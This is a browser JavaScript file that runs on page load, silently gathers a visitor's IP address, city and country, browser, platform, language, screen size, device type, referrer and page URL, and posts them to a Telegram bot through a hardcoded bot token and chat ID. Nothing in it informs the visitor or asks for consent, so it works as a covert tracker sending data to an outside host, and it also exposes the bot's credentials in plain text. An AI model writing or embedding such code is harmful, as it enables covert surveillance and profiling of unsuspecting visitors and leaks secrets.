// Function to get user's IP address
async function getUserIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error fetching IP address:', error);
        return 'Unknown';
    }
}

// Function to get geolocation data based on IP address
async function getGeolocation(ip) {
    try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await response.json();
        return data;
    } catch (error) {
        console.error('Error fetching geolocation:', error);
        return {};
    }
}

// Function to get browser information
function getBrowserInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
    };
}

// Function to get screen resolution
function getScreenResolution() {
    return {
        width: window.screen.width,
        height: window.screen.height,
    };
}

// Function to determine device type
function getDeviceType() {
    const ua = navigator.userAgent;
    if (/mobile/i.test(ua)) {
        return 'Mobile';
    } else if (/tablet/i.test(ua)) {
        return 'Tablet';
    } else {
        return 'Desktop';
    }
}

// Function to send data to Telegram bot
async function sendToTelegram(message) {
    const botToken = '7772131223:AAHoGl6iKgAq9DFKwlMXziG86sQe60e3jpg';
    const chatId = '1188723028';
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
            }),
        });

        if (response.ok) {
            console.log('Message sent to Telegram successfully');
        } else {
            console.error('Error sending message to Telegram');
        }
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

// Function to log user information
async function logUserInfo() {
    const ip = await getUserIP();
    const geolocation = await getGeolocation(ip);
    const browserInfo = getBrowserInfo();
    const screenResolution = getScreenResolution();
    const deviceType = getDeviceType();
    const referrer = document.referrer;
    const pageURL = window.location.href;
    const timestamp = new Date().toISOString();

    const userInfo = {
        ip,
        geolocation,
        browserInfo,
        screenResolution,
        deviceType,
        referrer,
        pageURL,
        timestamp,
    };

    console.log('User Information:', userInfo);

    // Format the message to be sent to Telegram
    const message = `
        User Information:
        IP: ${userInfo.ip}
        Location: ${userInfo.geolocation.city}, ${userInfo.geolocation.region}, ${userInfo.geolocation.country_name}
        Browser: ${userInfo.browserInfo.userAgent}
        Platform: ${userInfo.browserInfo.platform}
        Language: ${userInfo.browserInfo.language}
        Screen Resolution: ${userInfo.screenResolution.width}x${userInfo.screenResolution.height}
        Device Type: ${userInfo.deviceType}
        Referrer: ${userInfo.referrer}
        Page URL: ${userInfo.pageURL}
        Timestamp: ${userInfo.timestamp}
    `;

    // Send the message to Telegram
    sendToTelegram(message);
}

// Call the function to log user information
logUserInfo();
